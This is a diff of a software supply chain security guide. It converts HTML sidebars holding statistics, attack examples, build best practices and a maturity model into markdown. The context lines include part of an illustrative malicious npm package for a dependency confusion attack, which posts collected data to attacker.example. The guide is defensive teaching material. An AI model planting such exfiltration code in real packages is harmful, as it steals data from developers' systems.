@@ -42,8 +42,8 @@ These changes have dramatically increased the attack surface that organizations 
 
 ## The Modern Software Supply Chain Risk Landscape
 
-<div class="security-grid">
-<div class="security-grid-item security-grid-item-main">
+<div class="security-grid" markdown="1">
+<div class="security-grid-item security-grid-item-main" markdown="1">
 
 ### Key Concepts and Components
 
@@ -60,21 +60,22 @@ These changes have dramatically increased the attack surface that organizations 
 6. **Secure Build and CI/CD Systems**: Tools and processes that ensure the integrity of build environments and automation systems used to compile, test, and deploy code.
 
 7. **Trust Distribution and Verification**: Mechanisms for establishing and verifying trust in software components and their sources, often using cryptographic signatures.
+
 </div>
 
-<div class="security-grid-item security-grid-item-side">
-<div class="security-info-box">
-<strong>Critical Statistics</strong>
+<div class="security-grid-item security-grid-item-side" markdown="1">
+<div class="security-info-box" markdown="1">
 
-<ul>
-<li>64% of organizations experienced a software supply chain attack in 2022¹</li>
-<li>The average time to detect a software supply chain breach is 287 days²</li>
-<li>Software supply chain attacks increased by 742% from 2019-2022³</li>
-<li>98% of organizations use open source components in their code base⁴</li>
-<li>76% of application code now comes from open source and third-party components⁵</li>
-</ul>
+**Critical Statistics**
 
-<p><em>¹Anchore, ²IBM Security, ³Sonatype, ⁴Synopsys, ⁵Veracode</em></p>
+- 64% of organizations experienced a software supply chain attack in 2022¹
+- The average time to detect a software supply chain breach is 287 days²
+- Software supply chain attacks increased by 742% from 2019-2022³
+- 98% of organizations use open source components in their code base⁴
+- 76% of application code now comes from open source and third-party components⁵
+
+*¹Anchore, ²IBM Security, ³Sonatype, ⁴Synopsys, ⁵Veracode*
+
 </div>
 </div>
 </div>
@@ -110,8 +111,8 @@ Attackers inserted a backdoor into SolarWinds' build system, which was then dist
 
 ## Comprehensive Software Supply Chain Security Model
 
-<div class="security-grid">
-<div class="security-grid-item security-grid-item-main">
+<div class="security-grid" markdown="1">
+<div class="security-grid-item security-grid-item-main" markdown="1">
 
 The software supply chain can be viewed as a series of interconnected stages, each with its own security requirements and risks:
 
@@ -192,19 +193,20 @@ flowchart TD
 ```
 
 Each stage presents unique security challenges and requires specific controls:
+
 </div>
 
-<div class="security-grid-item security-grid-item-side">
-<div class="security-info-box">
-<strong>Supply Chain Attack Examples</strong>
+<div class="security-grid-item security-grid-item-side" markdown="1">
+<div class="security-info-box" markdown="1">
 
-<ul>
-<li><strong>Source:</strong> Codecov bash uploader compromise (2021)</li>
-<li><strong>Dependencies:</strong> event-stream malicious package (2018)</li>
-<li><strong>Build:</strong> SolarWinds Orion (2020)</li>
-<li><strong>Distribution:</strong> NotPetya attack via M.E.Doc updates (2017)</li>
-<li><strong>Deployment:</strong> Kaseya VSA ransomware attack (2021)</li>
-</ul>
+**Supply Chain Attack Examples**
+
+- **Source:** Codecov bash uploader compromise (2021)
+- **Dependencies:** event-stream malicious package (2018)
+- **Build:** SolarWinds Orion (2020)
+- **Distribution:** NotPetya attack via M.E.Doc updates (2017)
+- **Deployment:** Kaseya VSA ransomware attack (2021)
+
 </div>
 </div>
 </div>
@@ -295,8 +297,8 @@ chmod +x .git/hooks/pre-commit
 
 The build phase transforms source code into deployable artifacts, presenting unique security challenges:
 
-<div class="security-grid">
-<div class="security-grid-item security-grid-item-main">
+<div class="security-grid" markdown="1">
+<div class="security-grid-item security-grid-item-main" markdown="1">
 
 #### Key Security Controls for Build Systems
 
@@ -354,21 +356,22 @@ jobs:
         with:
           artifact-path: target/*.jar
 ```
+
 </div>
 
-<div class="security-grid-item security-grid-item-side">
-<div class="security-info-box">
-<strong>Build System Best Practices</strong>
+<div class="security-grid-item security-grid-item-side" markdown="1">
+<div class="security-info-box" markdown="1">
 
-<ul>
-<li>Verify build tool integrity before execution</li>
-<li>Run builds in ephemeral environments with no internet access</li>
-<li>Scan build artifacts for vulnerabilities and malware</li>
-<li>Use a dedicated service account for build operations</li>
-<li>Implement strict code review for build configuration changes</li>
-<li>Compare build outputs with expected hash values</li>
-<li>Enforce two-person review for critical build changes</li>
-</ul>
+**Build System Best Practices**
+
+- Verify build tool integrity before execution
+- Run builds in ephemeral environments with no internet access
+- Scan build artifacts for vulnerabilities and malware
+- Use a dedicated service account for build operations
+- Implement strict code review for build configuration changes
+- Compare build outputs with expected hash values
+- Enforce two-person review for critical build changes
+
 </div>
 </div>
 </div>
@@ -489,8 +492,8 @@ graph TD
 
 ### Attack Examples {#attack-examples}
 
-<div class="security-grid">
-<div class="security-grid-item security-grid-item-main">
+<div class="security-grid" markdown="1">
+<div class="security-grid-item security-grid-item-main" markdown="1">
 
 #### Dependency Confusion Attack
 
@@ -506,9 +509,10 @@ A dependency confusion attack exploits how package managers resolve dependencies
 - Configure package managers to always prefer private repositories
 - Implement verification of package provenance
 - Use dependency lockfiles to pin exact versions
+
 </div>
 
-<div class="security-grid-item security-grid-item-side">
+<div class="security-grid-item security-grid-item-side" markdown="1">
 ```javascript
 // Malicious package example (dependency confusion)
 // Published on public npm with a company's internal package name
@@ -527,6 +531,7 @@ fetch('https://attacker.example/collect', {
   body: JSON.stringify(payload)
 })
 ```
+
 </div>
 </div>
 
@@ -550,8 +555,8 @@ The SolarWinds attack illustrates how compromising build systems can have devast
 
 A comprehensive protection strategy must address security at each phase of the software supply chain:
 
-<div class="security-grid">
-<div class="security-grid-item security-grid-item-main">
+<div class="security-grid" markdown="1">
+<div class="security-grid-item security-grid-item-main" markdown="1">
 
 ### 1. Source Protection
 
@@ -584,35 +589,31 @@ A comprehensive protection strategy must address security at each phase of the s
 - **Maintain artifact metadata** including provenance information
 - **Implement immutable artifacts** to prevent tampering
 - **Scan artifacts** for vulnerabilities and malware
+
 </div>
 
-<div class="security-grid-item security-grid-item-side">
-<div class="security-info-box">
-<strong>Maturity Model for Supply Chain Security</strong>
+<div class="security-grid-item security-grid-item-side" markdown="1">
+<div class="security-info-box" markdown="1">
 
-<p><strong>Level 1: Basic</strong></p>
-<ul>
-<li>Source code version control</li>
-<li>Vulnerability scanning</li>
-<li>Basic access controls</li>
-<li>Manual build processes</li>
-</ul>
+**Maturity Model for Supply Chain Security**
 
-<p><strong>Level 2: Managed</strong></p>
-<ul>
-<li>SBOM generation</li>
-<li>MFA for source repositories</li>
-<li>Automated dependency scanning</li>
-<li>Basic build provenance</li>
-</ul>
+**Level 1: Basic**
+- Source code version control
+- Vulnerability scanning
+- Basic access controls
+- Manual build processes
 
-<p><strong>Level 3: Defined</strong></p>
-<ul>
-<li>Signed commits and artifacts</li>
-<li>Reproducible builds</li>
-<li>Isolated build environments</li>
-<li>Artifact integrity verification</li>
-</ul>
+**Level 2: Managed**
+- SBOM generation
+- MFA for source repositories
+- Automated dependency scanning
+- Basic build provenance
+
+**Level 3: Defined**
+- Signed commits and artifacts
+- Reproducible builds
+- Isolated build environments
+- Artifact integrity verification
 
 <p><strong>Level 4: Optimized</strong></p>
 <ul>
